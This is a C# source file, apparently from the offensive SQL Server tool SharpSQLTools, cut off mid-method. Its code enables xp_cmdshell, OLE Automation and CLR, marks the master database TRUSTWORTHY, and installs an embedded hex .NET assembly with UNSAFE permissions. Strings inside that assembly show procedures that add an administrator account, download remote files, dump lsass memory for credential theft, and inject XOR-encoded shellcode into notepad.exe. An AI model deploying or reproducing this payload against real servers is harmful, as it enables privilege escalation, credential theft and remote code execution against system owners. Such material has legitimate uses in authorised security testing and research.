using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Linq;
using System.Text;

namespace SharpSQLTools
{
    class Setting
    {
        private String Command = String.Empty;
        SqlConnection Conn = null;
        public Setting(SqlConnection Connection)
        {
            Conn = Connection;
        }

        /// <summary>
        /// 判断文件是否存在
        /// </summary>
        /// <param name="path">文件路径</param>
        /// <param name="value">返回值匹配</param>
        /// <returns></returns>
        public bool File_Exists(String path, int value)
        {
            Command = String.Format(@"
DECLARE @r INT
EXEC master.dbo.xp_fileexist '{0}', @r OUTPUT
SELECT @r as n", path);
            if (int.Parse(Batch.RemoteExec(Conn, Command, false)) == value)
                return true;
            return false;
        }


        /// <summary>
        /// 设置 configuration
        /// </summary>
        /// <param name="option">查询内容选项</param>
        /// <param name="value">返回值匹配</param>
        /// <returns></returns>
        public bool Set_configuration(String option, int value)
        {
            Command = String.Format("exec master.dbo.sp_configure '{0}',{1}; RECONFIGURE;", option, value);
            Batch.RemoteExec(Conn, Command, false);
            return Check_configuration(option, value);
        }
        /// <summary>
        /// 设置 permission_set
        /// </summary>
        /// <returns></returns>
        public void Set_permission_set()
        {
            Command = String.Format("ALTER DATABASE master SET TRUSTWORTHY ON;");
            Batch.CLRExec(Conn, Command);
        }

        /// <summary>
        /// CREATE ASSEMBLY
        /// </summary>
        /// <returns></returns>
        public void CREATE_ASSEMBLY()
        {
            Command = String.Format(@"CREATE ASSEMBLY [CLR_module]
    AUTHORIZATION [dbo]
    FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C01030020DB0A600000000000000000E00002210B010B000032000000060000000000002E50000000200000006000000000001000200000000200000400000000000000040000000000000000A000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000D44F00005700000000600000B002000000000000000000000000000000000000008000000C0000009C4E00001C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E7465787400000034300000002000000032000000020000000000000000000000000000200000602E72737263000000B0020000006000000004000000340000000000000000000000000000400000402E72656C6F6300000C00000000800000000200000038000000000000000000000000000040000042000000000000000000000000000000001050000000000000480000000200050008290000942500000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000133004006D000000010000111200FE15040000021200047D020000041200057D030000041200177D050000041200147D0600000412000E047D070000041200147D090000040317120016280100000616FE0116FE010B072C10280800000A72010000706F0900000A2A280800000A722D0000706F0900000A2A0000001330050045000000020000111200FE15030000021200057D01000004030419120017280200000616FE0116FE010B072C10280800000A725D0000706F0900000A2A280800000A72990000706F0900000A2A1E02280A00000A2A00000013300500200000000300001173050000060A72D90000700B06140203146F03000006061407026F040000062A1E02280A00000A2A1B300400A50000000400001102280C00000A74130000010A066F0D00000A74150000010B076F0E00000A0C0318730F00000A0D20000400008D1900000113040811041611048E696F1000000A13052B1A0911041611056F1100000A0811041611048E696F1000000A130511051630E1096F1200000A086F1200000A076F1300000A066F1400000A171307DE221306280800000A72F700007011066F1500000A281600000A6F0900000A161307DE0011072A0000000110000000000000808000221B000001A6020328080000062C10280800000A72150100706F0900000A2A280800000A723F0100706F0900000A2A1E02280A00000A2A0000133002001900000005000011281700000A0A06731800000A0B0720200200006F1900000A2A0000001B3004007E0000000600001103281A00000A2C1B280800000A726301007003281B00000A6F0900000A03281C00000A02281D00000A0A0317730F00000A0B071716731E00000A0C080616068E696F1100000ADE0A082C06086F1F00000ADCDE0A072C06076F1F00000ADCDE1D0D280800000A72C1010070096F2000000A281B00000A6F0900000ADE002A00000128000002003B000D48000A00000000020032002254000A00000000000000006060001D1B0000011B30070059020000070000117E2100000A0A160B140C021533117215020070282200000A0D09169A0C2B2802282300000A0CDE1F1304280800000A722102007011046F2000000A281B00000A6F0900000ADE28086F2400000A7215020070282500000A2C17280C0000062D10280800000A72490200706F0900000A2A086F2600000A0B086F2700000A0ADE301305280800000A72AB020070086F2400000A086F2600000A8C2500000111056F2000000A282800000A6F0900000ADEBF1613067205030070282900000A1307721B0300701107078C27000001282A00000A130872470300701107078C27000001282A00000A1309280800000A7273030070086F2400000A086F2600000A8C250000011108282800000A6F0900000A1108181918732B00000A130A0607110A6F2C00000A187E2100000A7E2100000A7E2100000A280B0000061306DE0C110A2C07110A6F1F00000ADC110639EE000000280800000A72AF0300706F0900000A280800000A72D903007011081109282A00000A6F0900000A11081109280D000006280800000A72250400701108281B00000A6F0900000A1108281C00000A280800000A7247040070078C27000001281B00000A6F0900000A72D0040070282900000A130B72FE040070130C7E2D00000A72000500706F2E00000A130D110D2C18725A050070110D72620500706F2F00000A281B00000A130C0215335E280800000A727A050070110C281B00000A6F0900000A280800000A72B2050070110B281B00000A6F0900000A280800000A72E8050070110B281B00000A6F0900000A2A280800000A72A106007011068C2D000001281B00000A6F0900000A2A0000000128000000001F000928001F1B00000100007000108000301B00000102001A01223C010C00000000133003003C000000080000117205030070282900000A0A72CB06007006281B00000A0B07283000000A2D16280800000A72DF06007007281B00000A6F0900000A2A15280E0000062A1E02280A00000A2A13300400CA000000090000110272330700706F3200000A2C06280F0000062A02724F0700706F3200000A2C2702178D3000000113091109161F209D11096F3300000A0A06179A0B06189A0C070828060000062A0272670700706F3200000A2C2B02178D30000001130A110A161F209D110A6F3300000A0D09179A130409189A13051104110528090000062A0272810700706F3200000A2C2E02178D30000001130B110B161F209D110B6F3300000A13061106179A13071106189A130811071108281D0000062A280800000A729B0700706F0900000A2A1E02280A00000A2A000013300A003F0000000A0000111A0A1201FE15100000021202FE150E00000216283400000A0216283400000A16283400000A160616283400000A16283400000A12011202281A00000626082A0013300600280000000B000011028E698D190000010A160B2B1306070207910307038E695D9161D29C0717580B07028E6932E7062A1B300500650100000C000011280800000A72B707007002281B00000A6F0900000A280800000A72EB07007003281B00000A6F0900000A02283500000A0A140B06283600000A036F3700000A281C0000060B160C720B080070281B0000060D280800000A724B0800706F0900000A20FF0F1F001612037B3700000428130000061304280800000A728508007012037C37000004283800000A281B00000A6F0900000A11047E2100000A078E6920003000001F4028140000061305280800000A72B70800706F0900000A1104110507078E69120228150000062C4B20FB0300001612037B3800000428160000061306110511067E2100000A2817000006261106281800000626280800000A72ED08007012037C37000004283800000A281B00000A6F0900000A11042819000006130711072C0F280800000A72590900706F0900000A280800000A72950900706F0900000ADE1F1308280800000A72F700007011086F1500000A281600000A6F0900000ADE002A000000411C0000000000000000000045010000450100001F0000001B0000011E02280A00000A2A42534A4201000100000000000C00000076322E302E35303732370000000005006C000000EC0A0000237E0000580B0000440D000023537472696E6773000000009C180000000A0000235553009C220000100000002347554944000000AC220000E802000023426C6F620000000000000002000001573D02140902000000FA253300160000010000003200000010000000500000001E00000045000000380000002800000004000000040000000C000000050000000B00000001000000030000000900000000000A0001000000000006001F0118010600260118010600300118010600250206020600510606020600640606020600580806020600760806020600B1089E082700C50800000600F408D40806001409D4080600320906020A0079095E090A0084095E0906009A0906020600B00906020E00C609BB090E00D809BB090E00E709BB090E00FF09BB090600190A0F0A0600320A0F0A06003D0A0F0A0600460A180106006B0A18010600790A18010600A90A8F0A0600C40A8F0A0600D50A8F0A0600F10A0F0A0E002E0B180B0E00390B180B0600490B18010600690B18010E00750B9E080600CD0B18010600D30B18010600F60B18010600FD0B0F0A0600080C0F0A06002E0C120C0600600C500C0600690C500C0600960C180106009E0C0F0A0A00A80C5E090600C70C18010600010D18010600260D1A0D00000000010000000000010001000100100019002E000500010001000A011100390000000900010006000A01110053000000090002000600000010005F002E0005000A0006000000100067002E0005000A0008000000100070002E0005000A000B00010010007A00000005000A001100000010008B002E0005000A001300020100009B0000000D000A001F0002010000AF0000000D0018001F0002010000BC0000000D0024001F0002010000CA0000000D002A001F000A011000D5000000090035001F000D011000E9000000090039001F000A0110000301000009003F001F0006007601320006008401320006008F01320006009E0135000600B10135000600BC0132000600CB0132000600D30135000600DF0132000606EA0235005680F202B6005680F602B60056800003B60056800D03B60056802403B60056803603B60056804903B6005680CB02B60056805903B60056806203B60056807103B60056808203B60056809A03B6000606EA0235005680A603FB005680B003FB005680BF03FB005680CB03FB005680D703FB005680E703FB005680F903FB0056800A04FB0056801604FB0056802B04FB0056803904FB000606EA02350056804404090156804F04090156805B0409015680650409015680740409010606EA02350056807E04210156808B04210156809D0421015680B40421015680CB0421015680D90421015680E70421015680F604210156800505210156801A052101060031052F0106003A052F0106004205350006004E053500060059052F01060063052F0106006E052F01060078052F01060082052F0106008C052F0101009905320101009C052F010100A7052F010100B1052F010100B90532010100BD0532010100C10532010100C90532010100D10532010100DF0532010100ED0532010600FE05320106000606350101001206350101001D062F01010029062F01010033062F0101003E062F01000000008000912035010A0001000000000080009120400114000500502000000000860058011F000A00CC20000000008600600127000E001D2100000000861870012E0011002821000000009600F10138001100542100000000861870012E0013005C21000000009600F5013E00130020220000000096000202380015004A2200000000861870012E00170000000000800091203002440017005422000000009600420250001E007C22000000009600520238001E0030230000000096005B0254002000C025000000009600020259002100082600000000861870012E002100102600000000960064025D002100E62600000000861870012E00220000000000800096206C026200220000000000800096207802690025000000000080009620870272002A0000000000800096209A027C002F000000000080009620A502840032000000000080009620B2028B0035000000000080009620BF02900036000000000080009620CB0295003700F026000000009600D902A70041003C27000000009600E602AD0042007027000000009600020238004400002900000000861870012E004600002001004606000002007206000003007806000004007C06002001004606002002008506000003007206000004007806000005008F06000001009C0600000200A70600000300B00600000400B906000001009C0600000200C40600000300A70600000100A70600000200B00600000100CE0600000200D20600000100DB0600000200DF0600000100310500000200E90600000300F30600000400F906000005000207000006000B07000007001B07000001002907000002003007101001003807000001003C07000001004007000002005007000003004205000001003105000002005F07000003006907000004007007000005008107000001003105000002008B0700200300990700000400A20700000500A807000001004007000002005007000003004E0500000100BF07000002003A0500000300C607000001003A0500000100CD0700000100D50700000200E70700000300F507000004000308000005001308000006002308000007003108000008003F08010009004C0802000A006408000001008308000001008E08000002009508000001009908000002009508290070013801390070012E00410070012E00490070014701590070014D01610070012E0069007001520171008C095701790095095201090070012E008100700168019100D10974019100F3097A01A100200A7F01B90070018401B1004B0A8B01B100500A9301B100560A2E00A100560A2E0091005C0A2E000900620A9B01D100720A9F01E100B90AB601E9007001BB01E900E80AC101F900F60ACE01D100FD0AD301F900040B5D00F9000B0BD90101017001DF011101550B2E00D9005D0B9B011901700B2F0121017D0BF5012101900BFD0121019F0B9B01D100AF0B3E002101BB0B04022101C20B0802D100FD0A0C023101DF0B1402D100FD0A1902B90070012002B9003D0C2D025901750C33026101820C380261018D0C3F027101F60ACE01790170012E00D100BE0C6402D100CC0C69021901F50C85028901090DD90191012F0D98029101390D9E022901620A9B0108002C00BA0008003000BF0008003400C40008003800C90008003C00CE0008004000D30008004400D80008004800DD0008004C00E20008005000E70008005400EC0008005800F10008005C00F60008006400BF0008006800C40008006C00C90008007000CE0008007400D30008007800D80008007C00DD0008008000E20008008100400108008400E70008008800FF0008008C00040108009400F100080098000D0108009C0012010800A00017010800A4001C010800AC00CE000800B000D3000800B400D8000800B800DD000800BC00BF000800C000C4000800C40025010800C800C9000800CC002A010800D0002A012E002300B4022E002B00BD022E003300C60220028B01BF0003003E010B003E010D003E01590045015C0162016E01A501C701E90144025F0270028A029202A4024509830AD20CDB0CE80C000103003501010000010500400101004503170030020200440127006C020300440129007802030044012B008702030044012D009A02040044012F00A502040044013100B202040044013300BF02030046033500CB0205000480000000000000000000000000000000002E00000002000000000000000000000001000F01000000000200000000000000000000000100520900000000020000000000000000000000010018010000000003000200040002000A0009000B0009000C0009000D0009000E0009000F0009001000090000000000003C4D6F64756C653E00434C525F6D6F64756C652E646C6C004C6F63616C47726F75705573657248656C70657200434C525F6D6F64756C65004C4F43414C47524F55505F4D454D424552535F494E464F5F3300555345525F494E464F5F31006164647573657200646F776E6C6F61640064756D706C736173730053746F72656450726F63656475726573007368656C6C636F64656C6F616465720050726F6365737341636365737352696768747300546872656164416363657373004D656D416C6C6F636174696F6E004D656D50726F746563740050524F434553535F494E464F524D4154494F4E0050524F434553535F42415349435F494E464F524D4154494F4E0053544152545550494E464F006D73636F726C69620053797374656D004F626A6563740056616C75655479706500456E756D004E657455736572416464004E65744C6F63616C47726F75704164644D656D6265727300416464557365720047726F75704164644D656D62657273002E63746F7200646F6D61696E616E646E616D650075737269315F6E616D650075737269315F70617373776F72640075737269315F70617373776F72645F6167650075737269315F707269760075737269315F686F6D655F64697200636F6D6D656E740075737269315F666C6167730075737269315F7363726970745F706174680061646400446F776E6C6F616446696C650072756E0053797374656D2E52756E74696D652E496E7465726F705365727669636573005361666548616E646C65004D696E6944756D70577269746544756D7000497348696768496E7465677269747900436F6D7072657373004D696E6964756D7000436C7245786563004F70656E50726F63657373005669727475616C416C6C6F63457800577269746550726F636573734D656D6F7279004F70656E5468726561640051756575655573657241504300526573756D6554687265616400436C6F736548616E646C650043726561746550726F6365737300537461727450726F63657373005830720076616C75655F5F00416C6C005465726D696E61746500437265617465546872656164005669727475616C4D656D6F72794F7065726174696F6E005669727475616C4D656D6F727952656164005669727475616C4D656D6F72795772697465004475706C696361746548616E646C650053657451756F746100536574496E666F726D6174696F6E005175657279496E666F726D6174696F6E0051756572794C696D69746564496E666F726D6174696F6E0053796E6368726F6E697A65005445524D494E4154450053555350454E445F524553554D45004745545F434F4E54455854005345545F434F4E54455854005345545F494E464F524D4154494F4E0051554552595F494E464F524D4154494F4E005345545F5448524541445F544F4B454E00494D504552534F4E415445004449524543545F494D504552534F4E4154494F4E005448524541445F48494A41434B005448524541445F414C4C004D454D5F434F4D4D4954004D454D5F52455345525645004D454D5F5245534554004D454D5F52455345545F554E444F00536563436F6D6D697400504147455F4558454355544500504147455F455845435554455F5245414400504147455F455845435554455F52454144575249544500504147455F455845435554455F5752495445434F505900504147455F4E4F41434345535300504147455F524541444F4E4C5900504147455F52454144575249544500504147455F5752495445434F505900504147455F544152474554535F494E56414C494400504147455F544152474554535F4E4F5F555044415445006850726F63657373006854687265616400647750726F6365737349640064775468726561644964005265736572766564310050656241646472657373005265736572766564320052657365727665643300556E69717565506964004D6F72655265736572766564006362006C705265736572766564006C704465736B746F70006C705469746C6500647758006477590064775853697A650064775953697A6500647758436F756E74436861727300647759436F756E74436861727300647746696C6C41747472696275746573006477466C616773007753686F7757696E646F770063625265736572766564006C705265736572766564320068537464496E70757400685374644F75747075740068537464457272007365727665726E616D65004D61727368616C417341747472696275746500556E6D616E6167656454797065006C6576656C00627566007061726D5F6572720067726F75706E616D6500746F74616C656E7472696573007365727665724E616D6500757365724E616D650070617373776F726400737472436F6D6D656E740067726F75704E616D650055524C0066696C656E616D650075726C006C6F63616C706174680070726F636573734964006846696C650064756D705479706500657870506172616D007573657253747265616D506172616D0063616C6C6261636B506172616D00696E46696C65006F757446696C650070696400636D64006477446573697265644163636573730062496E686572697448616E646C65006C704164647265737300647753697A6500666C416C6C6F636174696F6E5479706500666C50726F74656374006C704261736541646472657373006C70427566666572006E53697A65006C704E756D6265724F6642797465735772697474656E0070666E4150430064774461746100684F626A656374006C704170706C69636174696F6E4E616D65006C70436F6D6D616E644C696E65006C7050726F6341747472696273006C70546872656164417474726962730062496E686572697448616E646C6573006477437265617465466C616773006C70456E7669726F6E6D656E74006C7043757272656E74446972006C705374617274696E666F00496E417474726962757465006C7050726F63496E666F726D6174696F6E004F75744174747269627574650062696E6172795061746800636970686572006B657900636F64650053797374656D2E446961676E6F73746963730044656275676761626C6541747472696275746500446562756767696E674D6F6465730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300436F6D70696C6174696F6E52656C61786174696F6E734174747269627574650052756E74696D65436F6D7061746962696C69747941747472696275746500446C6C496D706F7274417474726962757465004E657461706933322E646C6C0053797374656D2E44617461004D6963726F736F66742E53716C5365727665722E5365727665720053716C436F6E746578740053716C50697065006765745F506970650053656E64005374727563744C61796F7574417474726962757465004C61796F75744B696E640053797374656D2E4E657400576562526571756573740043726561746500487474705765625265717565737400576562526573706F6E736500476574526573706F6E73650048747470576562526573706F6E73650053797374656D2E494F0053747265616D00476574526573706F6E736553747265616D0046696C6553747265616D0046696C654D6F64650042797465005265616400577269746500436C6F73650041626F727400546F537472696E6700537472696E6700436F6E63617400457863657074696F6E0064626768656C702E646C6C0053797374656D2E53656375726974792E5072696E636970616C0057696E646F77734964656E746974790047657443757272656E740057696E646F77735072696E636970616C0057696E646F77734275696C74496E526F6C65004973496E526F6C650046696C650045786973747300466F726D61740044656C6574650052656164416C6C42797465730053797374656D2E494F2E436F6D7072657373696F6E00475A697053747265616D00436F6D7072657373696F6E4D6F64650049446973706F7361626C6500446973706F7365006765745F4D65737361676500496E74507472005A65726F0050726F636573730047657450726F63657373657342794E616D650047657450726F6365737342794964006765745F50726F636573734E616D65006F705F457175616C697479006765745F4964006765745F48616E646C6500496E74333200456E7669726F6E6D656E7400476574456E7669726F6E6D656E745661726961626C650055496E7433320046696C654163636573730046696C655368617265004D6963726F736F66742E57696E33322E5361666548616E646C6573005361666546696C6548616E646C65006765745F5361666546696C6548616E646C65004D6963726F736F66742E57696E33320052656769737472790052656769737472794B6579004C6F63616C4D616368696E65004F70656E5375624B65790047657456616C756500426F6F6C65616E004469726563746F72790053716C50726F63656475726541747472696275746500436F6E7461696E7300436861720053706C6974004B65726E656C3332006B65726E656C33322E646C6C004B65726E656C33322E646C6C006F705F4578706C6963697400436F6E766572740046726F6D426173653634537472696E670053797374656D2E5465787400456E636F64696E67006765745F4153434949004765744279746573000000002B5B0058005D0020004500720072006F007200200041006400640069006E00670020005500730065007200002F5B002A005D00200041006400640069006E0067002000550073006500720020007300750063006300650073007300003B5B0058005D0020004500720072006F007200200041006400640069006E0067002000470072006F007500700020004D0065006D00620065007200003F5B002A005D00200041006400640069006E0067002000470072006F007500700020004D0065006D0062006500720020007300750063006300650073007300001D410064006D0069006E006900730074007200610074006F0072007300001D5B0058005D0020004500520052004F00520020004C006F0067003A0000295B002A005D00200044006F0077006E006C006F00610064002000730075006300630065007300730000235B0058005D00200044006F0077006E006C006F006100640020006600610069006C00005D5B0058005D0020004F00750074007000750074002000660069006C006500200027007B0030007D002700200061006C007200650061006400790020006500780069007300740073002C002000720065006D006F00760069006E00670001535B0058005D00200045007800630065007000740069006F006E0020007700680069006C006500200063006F006D007000720065007300730069006E0067002000660069006C0065003A0020007B0030007D00000B6C00730061007300730000270A005B0058005D0045007800630065007000740069006F006E003A0020007B0030007D000A0000610A005B0058005D0020004E006F007400200069006E0020006800690067006800200069006E0074006500670072006900740079002C00200075006E00610062006C006500200074006F0020004D0069006E006900440075006D00700021000A0000590A005B0058005D0020004500720072006F0072002000670065007400740069006E0067002000680061006E0064006C006500200074006F0020007B0030007D00200028007B0031007D0029003A0020007B0032007D000A000015530079007300740065006D0052006F006F007400002B7B0030007D005C00540065006D0070005C00640065006200750067007B0031007D002E006F0075007400002B7B0030007D005C00540065006D0070005C00640065006200750067007B0031007D002E00620069006E00003B0A005B002A005D002000440075006D00700069006E00670020007B0030007D00200028007B0031007D002900200074006F0020007B0032007D0000295B002B005D002000440075006D00700020007300750063006300650073007300660075006C002100004B0A005B002A005D00200043006F006D007000720065007300730069006E00670020007B0030007D00200074006F0020007B0031007D00200067007A00690070002000660069006C00650000215B002A005D002000440065006C006500740069006E00670020007B0030007D000080870A005B002B005D002000440075006D00700069006E006700200063006F006D0070006C0065007400650064002E002000520065006E0061006D0065002000660069006C006500200074006F0020002200640065006200750067007B0030007D002E0067007A002200200074006F0020006400650063006F006D00700072006500730073002E00002D500052004F0043004500530053004F0052005F004100520043004800490054004500430054005500520045000001005953006F006600740077006100720065005C004D006900630072006F0073006F00660074005C00570069006E0064006F007700730020004E0054005C00430075007200720065006E007400560065007200730069006F006E0000077B0030007D000017500072006F0064007500630074004E0061006D00650000370A005B002A005D0020004F007000650072006100740069006E0067002000530079007300740065006D0020003A0020007B0030007D0000355B002A005D002000410072006300680069007400650063007400750072006500200020002000200020003A0020007B0030007D000080B75B002A005D00200055007300650020002200730065006B00750072006C00730061003A003A006D0069006E006900640075006D0070002000640065006200750067002E006F0075007400220020002200730065006B00750072006C00730061003A003A006C006F0067006F006E00500061007300730077006F007200640073002000660075006C006C00220020006F006E0020007400680065002000730061006D00650020004F0053002F0061007200630068000A0000295B0058005D002000440075006D00700020006600610069006C00650064003A0020007B0030007D0000137B0030007D005C00540065006D0070005C0000530A005B0058005D002000440075006D00700020006400690072006500630074006F0072007900200022007B0030007D002200200064006F00650073006E002700740020006500780069007300740021000A00011B63006C0072005F00640075006D0070006C007300610073007300001763006C0072005F006100640064007500730065007200001963006C0072005F0064006F0077006E006C006F0061006400001963006C0072005F00730063006C006F006100640065007200001B43006F006D006D0061006E00640020006500720072006F00720000335B002B005D00200045006E00630072007900700074005300680065006C006C0063006F00640065003A0020007B0030007D00001F5B002B005D00200058006F0072004B00650079003A0020007B0030007D00003F43003A002F00570069006E0064006F00770073002F00530079007300740065006D00330032002F006E006F00740065007000610064002E0065007800650000395B002B005D00200053007400610072007400500072006F00630065007300730020006E006F00740065007000610064002E0065007800650000315B002B005D0020004F00700065006E00500072006F00630065007300730020005000690064003A0020007B0030007D0000355B002B005D0020005600690072007400750061006C0041006C006C006F0063004500780020005300750063006300650073007300006B5B002B005D002000510075006500750065005500730065007200410050004300200049006E006A0065006300740020007300680065006C006C0063006F0064006500200074006F0020005000490044003A0020007B0030007D0020005300750063006300650073007300003B5B002B005D00200068004F00700065006E00500072006F00630065007300730043006C006F00730065002000530075006300630065007300730000670A000A005B002A005D002000510075006500750065005500730065007200410050004300200049006E006A0065006300740020007300680065006C006C0063006F0064006500200053007500630063006500730073002C00200065006E006A006F0079002100000000000A5163FA72BDE54F908991DD50B5B5070008B77A5C561934E089090004080E08101110080A0005080E0E0810110C08072004010E0E0E0E062003010E0E0E0320000102060E020608050002010E0E050002020E0E0B000702180912110918181803000002040001010803000001040001010E060003180902090800051818180909090900050218181C09100907000318112C0209060003181818180400010918040001021811000A02180E18180209181810114010113805000111380E0800021D051D051D050306112804FF0F1F000401000000040200000004080000000410000000042000000004400000000480000000040001000004000200000400040000040010000004000010000306112C041A00000004FB0300000306113004002000000400000800040000000104000000080306113404040000000400000040020618020609020607052001011119011504FFFFFFFF01280520010111290420010108042001010E040000123D050702111002050702110C0205200101114505070212080E05000112490E04200012510420001259062002010E1161072003081D050808072003011D0508080320000E0500020E0E0E100708124D1255125912591D0508126D02040000127105200101127105200102117906070212711275040001020E0500020E0E1C0500011D050E092003011259118085020B07041D05125D128081126D0700011D1280910E0600011280910803200008032000180700040E0E1C1C1C0400010E0E0600030E0E1C1C0C2004010E11611180A11180A50520001280A904061280B10620011280B10E0420011C0E1A070E18091280911D128091126D126D020E0E0E125D0E0E1280B10407020E0E042001020E0620011D0E1D0314070C1D0E0E0E1D0E0E0E1D0E0E0E1D031D031D03040001180807070309114011380507021D05080500001280C90520011D050E0F07091D051D0509113818181802126D0801000200000000000801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010000000000000020DB0A6000000000020000001C010000B84E0000B8300000525344538268F85662B6BF468BF818C4C827341001000000643A5C6D79636F64655C536861727053514C546F6F6C735C434C522D6D6F64756C655C6F626A5C52656C656173655C434C525F6D6F64756C652E70646200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FC4F000000000000000000001E500000002000000000000000000000000000000000000000000000105000000000000000000000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF25002000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100100000001800008000000000000000000000000000000100010000003000008000000000000000000000000000000100000000004800000058600000540200000000000000000000540234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000000000000000000000000000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004B4010000010053007400720069006E006700460069006C00650049006E0066006F0000009001000001003000300030003000300034006200300000002C0002000100460069006C0065004400650073006300720069007000740069006F006E000000000020000000300008000100460069006C006500560065007200730069006F006E000000000030002E0030002E0030002E003000000040000F00010049006E007400650072006E0061006C004E0061006D006500000043004C0052005F006D006F00640075006C0065002E0064006C006C00000000002800020001004C006500670061006C0043006F00700079007200690067006800740000002000000048000F0001004F0072006900670069006E0061006C00460069006C0065006E0061006D006500000043004C0052005F006D006F00640075006C0065002E0064006C006C0000000000340008000100500072006F006400750063007400560065007200730069006F006E00000030002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000030002E0030002E0030002E003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005000000C000000303000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    WITH PERMISSION_SET = UNSAFE;");
            Batch.CLRExec(Conn, Command);
        }

        /// <summary>
        /// CREATE PROCEDURE
        /// </summary>
        /// <returns></returns>
        public void CREATE_PROCEDURE()
        {
            Command = String.Format(@"CREATE PROCEDURE [dbo].[ClrExec]
@cmd NVARCHAR (MAX)
AS EXTERNAL NAME [CLR_module].[StoredProcedures].[ClrExec]");
            Batch.CLRExec(Conn, Command);
        }

        /// <summary>
        /// drop_clr
        /// </summary>
        /// <returns></returns>
        public void drop_clr()
        {
            Command = String.Format(@"drop PROCEDURE dbo.ClrExec
drop assembly CLR_module");
            Batch.CLRExec(Conn, Command);
        }


        /// <summary>
        /// 检查 configuration 的配置
        /// </summary>
        /// <param name="option">查询内容选项</param>
        /// <param name="value">返回值匹配</param>
        /// <returns></returns>
        public bool Check_configuration(String option, int value)
        {
            Command = String.Format("SELECT cast(value as INT) as v FROM sys.configurations where name = '{0}';", option);
            if (int.Parse(Batch.RemoteExec(Conn, Command, false)) == value)
                return true;
            return false;
        }

        #region 启用/关闭 OLE Automation Procedures 配置
        /// <summary>
        /// 开启 OLA
        /// </summary>
        /// <returns>true/false</returns>
        public bool Enable_ola()
        {
            if (!Set_configuration("show advanced options", 1))
            {
                Console.WriteLine("[!] cannot enable 'show advanced options'");
                return false;
            }
            if (!Set_configuration("Ole Automation Procedures", 1))
            {
                Console.WriteLine("[!] cannot enable 'Ole Automation Procedures'");
                return false;
            }
            return true;
        }

        /// <summary>
        /// 关闭 OLA
        /// </summary>
        /// <returns>true/false</returns>
        public bool Disable_ole()
        {
            if (!Set_configuration("show advanced options", 1))
            {
                Console.WriteLine("[!] cannot enable 'show advanced options'");
                return false;
            }
            if (!Set_configuration("Ole Automation Procedures", 0))
            {
                Console.WriteLine("[!] cannot disable 'Ole Automation Procedures'");
                return false;
            }
            if (!Set_configuration("show advanced options", 0))
            {
                Console.WriteLine("[!] cannot disable 'show advanced options'");
                return false;
            }
            return true;
        }

        #endregion


        #region 启用/关闭 xp_cmdshell
        /// <summary>
        /// 开启 xp_cmdshell
        /// </summary>
        /// <returns>true/false</returns>
        public bool Enable_xp_cmdshell()
        {
            if (!Set_configuration("show advanced options", 1))
            {
                Console.WriteLine("[!] cannot enable 'show advanced options'");
                return false;
            }
            if (!Set_configuration("xp_cmdshell", 1))
            {
                Console.WriteLine("[!] cannot enable 'xp_cmdshell'");
                return false;
            }
            return true;
        }

        /// <summary>
        /// 关闭 xp_cmdshell
        /// </summary>
        /// <returns>true/false</returns>
        public bool Disable_xp_cmdshell()
        {
            if (!Set_configuration("show advanced options", 1))
            {
                Console.WriteLine("[!] cannot enable 'show advanced options'");
                return false;
            }
            if (!Set_configuration("xp_cmdshell", 0))
            {
                Console.WriteLine("[!] cannot disable 'xp_cmdshell'");
                return false;
            }
            if (!Set_configuration("show advanced options", 0))
            {
                Console.WriteLine("[!] cannot disable 'show advanced options'");
                return false;
            }
            return true;
        }

        #endregion

        #region 启用/关闭 clr
        /// <summary>
        /// 开启 clr enabled
        /// </summary>
        /// <returns>true/false</returns>
        public bool Enable_clr()
        {
            if (!Set_configuration("show advanced options", 1))
            {
                Console.WriteLine("[!] cannot enable 'show advanced options'");
                return false;
            }
